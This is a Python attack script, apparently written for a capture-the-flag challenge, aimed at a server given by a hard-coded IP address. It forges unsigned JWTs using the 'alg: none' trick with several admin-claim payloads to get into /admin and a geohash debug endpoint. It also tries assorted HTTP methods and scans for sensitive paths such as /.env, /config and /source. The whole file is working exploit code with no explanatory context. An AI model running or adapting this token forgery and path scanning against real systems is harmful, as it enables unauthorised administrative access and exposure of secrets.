import requests
import json
import base64
import hashlib
import hmac
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

BASE = "http://138.199.163.92:12973"

def log(msg):
    print(msg)

# Step 1: Get main page raw HTML
r = requests.get(BASE, timeout=10)
log(f"Main page headers:")
for k, v in r.headers.items():
    log(f"  {k}: {v}")
log(f"\nMain page HTML:\n{r.text}\n")

# Step 2: Try POST to geohash-debug endpoint
log("=== POST /api/v3/geohash-debug-2025 ===")
r = requests.post(f"{BASE}/api/v3/geohash-debug-2025", timeout=10)
log(f"Status: {r.status_code}")
log(f"Response: {r.text}")
for k, v in r.headers.items():
    log(f"  {k}: {v}")

# Step 3: Try different methods on debug endpoint
for method in ["PUT", "PATCH", "DELETE", "OPTIONS"]:
    r = requests.request(method, f"{BASE}/api/v3/geohash-debug-2025", timeout=10)
    log(f"\n{method} /api/v3/geohash-debug-2025: {r.status_code}")
    log(f"  {r.text[:500]}")

# Step 4: Check admin with JWT "none" algorithm
# Create JWT with alg: none and role: admin
# JWT format: base64url(header).base64url(payload).signature
def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

# alg: none attack
header_none = {"alg": "none", "typ": "JWT"}
payload_admin = {"role": "admin", "user": "admin"}
jwt_none = f"{b64url(header_none)}.{b64url(payload_admin)}."

log(f"\n=== JWT None Attack ===")
log(f"JWT: {jwt_none}")

for auth_header in [
    f"Bearer {jwt_none}",
    jwt_none,
]:
    r = requests.get(f"{BASE}/admin", headers={"Authorization": auth_header}, timeout=10)
    log(f"\nGET /admin with '{auth_header[:50]}...': {r.status_code}")
    log(f"  {r.text[:500]}")

# Also try with Cookie
r = requests.get(f"{BASE}/admin", cookies={"token": jwt_none}, timeout=10)
log(f"\nGET /admin with cookie token: {r.status_code}")
log(f"  {r.text[:500]}")

# Step 5: Try POST geohash-debug with JWT
r = requests.post(f"{BASE}/api/v3/geohash-debug-2025", 
    headers={"Authorization": f"Bearer {jwt_none}"}, timeout=10)
log(f"\nPOST /api/v3/geohash-debug-2025 with JWT: {r.status_code}")
log(f"  {r.text[:500]}")

# Step 6: Try different payloads for JWT
payloads_to_try = [
    {"role": "admin", "user": "admin"},
    {"role": "admin"},
    {"sub": "admin", "role": "admin"},
    {"username": "admin", "role": "admin"},
    {"user": "admin", "admin": True},
    {"iss": "equator-nav", "role": "admin"},
]

for payload in payloads_to_try:
    jwt_token = f"{b64url(header_none)}.{b64url(payload)}."
    
    r = requests.get(f"{BASE}/admin", 
        headers={"Authorization": f"Bearer {jwt_token}"}, timeout=10)
    if r.status_code != 401:
        log(f"\n!!! Admin access changed with payload {payload}: {r.status_code}")
        log(f"  {r.text[:500]}")
    
    r = requests.post(f"{BASE}/api/v3/geohash-debug-2025",
        headers={"Authorization": f"Bearer {jwt_token}"}, timeout=10)
    if r.status_code != 405 and r.status_code != 401:
        log(f"\n!!! Debug endpoint with payload {payload}: {r.status_code}")
        log(f"  {r.text[:500]}")

# Step 7: Try common API paths
log("\n=== Scanning API paths ===")
paths = [
    "/api", "/api/v3", "/api/v3/flag", "/api/v3/admin",
    "/api/v3/geohash", "/api/v3/coordinates", "/api/v3/decrypt",
    "/api/v3/login", "/api/v3/auth", "/api/v3/token",
    "/api/v1/geohash-debug-2025", "/api/v2/geohash-debug-2025",
    "/login", "/auth", "/token", "/api/v3/null-island",
    "/api/v3/transmission", "/api/v3/secret",
    "/.env", "/config", "/debug", "/source",
]

for path in paths:
    try:
        r = requests.get(f"{BASE}{path}", timeout=5)
        if r.status_code != 404:
            log(f"  GET {path}: {r.status_code} -> {r.text[:200]}")
    except:
        pass
    try:
        r = requests.post(f"{BASE}{path}", timeout=5)
        if r.status_code != 404 and r.status_code != 405:
            log(f"  POST {path}: {r.status_code} -> {r.text[:200]}")
    except:
        pass

log("\nDone!")
